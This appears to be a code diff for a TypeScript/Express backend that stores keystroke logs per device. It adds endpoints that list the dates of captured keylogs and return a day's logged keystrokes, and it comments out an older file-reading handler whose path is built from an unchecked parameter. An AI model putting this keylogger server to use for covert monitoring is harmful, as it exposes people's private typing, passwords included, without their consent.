@@ -26,6 +26,109 @@ export const addNewKeyLogs = async (data: any) => {
 	}
 };
 
+// Get Keylogs list of distinct dates by deviceId
+export const getKeyLogsLists = async (req: Request, res: Response) => {
+	const errors = validationResult(req);
+	if (!errors.isEmpty()) {
+		return res.status(400).json({ errors: errors.array() });
+	}
+
+	const { deviceId } = req.params;
+
+	try {
+		// Use MongoDB aggregation to group keylogs by date (YYYY-MM-DD) and get distinct dates
+		const keyLogsDates = await KeyLogs.aggregate([
+			{
+				$match: {
+					deviceId: deviceId,
+				},
+			},
+			{
+				$group: {
+					_id: {
+						$dateToString: {
+							format: "%Y-%m-%d",
+							date: "$created_at",
+						},
+					},
+				},
+			},
+			{
+				$sort: { _id: -1 }, // Sort by date in descending order
+			},
+		]);
+
+		// Extract distinct dates from the aggregation result
+		const dates = keyLogsDates.map((log) => log._id);
+
+		return res.status(200).json({ status: 200, dates });
+	} catch (error) {
+		console.error("Error processing keylogs:", error);
+		res.status(500).json({ error: "Failed to process the keylogs" });
+	}
+};
+
+// Get Keylog Contents by deviceId and keylog (date)
+export const getKeyLogContents = async (req: Request, res: Response) => {
+	const errors = validationResult(req);
+	if (!errors.isEmpty()) {
+		return res.status(400).json({ errors: errors.array() });
+	}
+
+	const { deviceId, keylog } = req.params;
+
+	try {
+		// Parse the keylog string (YYYY-MM-DD format) into a Date object
+		const date = new Date(keylog);
+
+		// Check if the date is valid
+		if (isNaN(date.getTime())) {
+			return res.status(400).json({ error: "Invalid date format" });
+		}
+
+		// Define the start and end of the day (UTC midnight to 11:59:59.999)
+		const startOfDay = new Date(
+			Date.UTC(
+				date.getUTCFullYear(),
+				date.getUTCMonth(),
+				date.getUTCDate(),
+				0,
+				0,
+				0,
+				0
+			)
+		);
+		const endOfDay = new Date(
+			Date.UTC(
+				date.getUTCFullYear(),
+				date.getUTCMonth(),
+				date.getUTCDate(),
+				23,
+				59,
+				59,
+				999
+			)
+		);
+
+		// Query KeyLogs to find all entries for the given day by deviceId
+		const keyLogContents = await KeyLogs.find({
+			deviceId: deviceId,
+			created_at: {
+				$gte: startOfDay,
+				$lt: endOfDay,
+			},
+		}).sort({ created_at: -1 });
+
+		// Return the results
+		return res.status(200).json({ status: 200, keyLogContents });
+	} catch (error) {
+		console.error("Error processing keylogs content:", error);
+		res.status(500).json({
+			error: "Failed to process the keylogs content",
+		});
+	}
+};
+
 // Add New KeyLogs
 // export const addNewKeyLogs = async (data: any) => {
 // 	try {
@@ -72,47 +175,47 @@ export const addNewKeyLogs = async (data: any) => {
 // };
 
 // Get Key Logs by DeviceId
-export const getKeyLogsFiles = async (req: Request, res: Response) => {
-	const errors = validationResult(req);
-	if (!errors.isEmpty()) {
-		return res.status(400).json({ errors: errors.array() });
-	}
+// export const getKeyLogsFiles = async (req: Request, res: Response) => {
+// 	const errors = validationResult(req);
+// 	if (!errors.isEmpty()) {
+// 		return res.status(400).json({ errors: errors.array() });
+// 	}
 
-	const { deviceId } = req.params;
+// 	const { deviceId } = req.params;
 
-	try {
-		// Assuming the keylogs are stored in public/keylogs/username
-		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId); // Adjust path as needed
+// 	try {
+// 		// Assuming the keylogs are stored in public/keylogs/username
+// 		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId); // Adjust path as needed
 
-		// Check if the directory exists
-		if (!fs.existsSync(logsDir)) {
-			return res
-				.status(404)
-				.json({ message: "No logs found for this device" });
-		}
+// 		// Check if the directory exists
+// 		if (!fs.existsSync(logsDir)) {
+// 			return res
+// 				.status(404)
+// 				.json({ message: "No logs found for this device" });
+// 		}
 
-		// Read all .txt files in the directory
-		const files = fs
-			.readdirSync(logsDir)
-			.filter((file) => file.endsWith(".txt"));
+// 		// Read all .txt files in the directory
+// 		const files = fs
+// 			.readdirSync(logsDir)
+// 			.filter((file) => file.endsWith(".txt"));
 
-		// Initialize an array to store the content of each file
-		const logs = [];
+// 		// Initialize an array to store the content of each file
+// 		const logs = [];
 
-		// Read the content of each file and push it to the logs array
-		for (const file of files) {
-			const filePath = path.join(logsDir, file);
-			const content = fs.readFileSync(filePath, "utf8");
-			logs.push({ filename: file, content });
-		}
+// 		// Read the content of each file and push it to the logs array
+// 		for (const file of files) {
+// 			const filePath = path.join(logsDir, file);
+// 			const content = fs.readFileSync(filePath, "utf8");
+// 			logs.push({ filename: file, content });
+// 		}
 
-		// Return the array of logs
-		res.status(200).json(logs);
-	} catch (error) {
-		console.error("Error processing keylogs:", error);
-		res.status(500).json({ error: "Failed to process the keylogs" });
-	}
-};
+// 		// Return the array of logs
+// 		res.status(200).json(logs);
+// 	} catch (error) {
+// 		console.error("Error processing keylogs:", error);
+// 		res.status(500).json({ error: "Failed to process the keylogs" });
+// 	}
+// };
 
 // Define the base path where keylog files are stored
 export const removeKeyLogs = async (req: Request, res: Response) => {
